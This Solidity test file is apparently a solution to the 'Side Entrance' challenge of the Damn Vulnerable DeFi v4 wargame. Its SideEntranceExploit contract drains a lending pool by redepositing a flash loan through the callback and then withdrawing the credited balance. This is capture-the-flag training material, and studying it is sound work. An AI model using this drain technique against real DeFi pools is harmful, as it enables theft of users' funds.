// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

// @audit-info safe transfer method for ETH
import "solmate/utils/SafeTransferLib.sol";


contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool public pool;

    // @audit-info added exploit contract
    SideEntranceExploit exploit;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        exploit = new SideEntranceExploit(address(pool), address(recovery));
        exploit.exploit();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

contract SideEntranceExploit {
    using SafeTransferLib for address;
    SideEntranceLenderPool pool;
    address recovery;
    uint256 constant ETHER_IN_POOL = 1000e18;

    constructor(
        address _pool,
        // address _token,
        address _recovery
    ) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function exploit() external {
        pool.flashLoan(ETHER_IN_POOL);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
    }
    
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}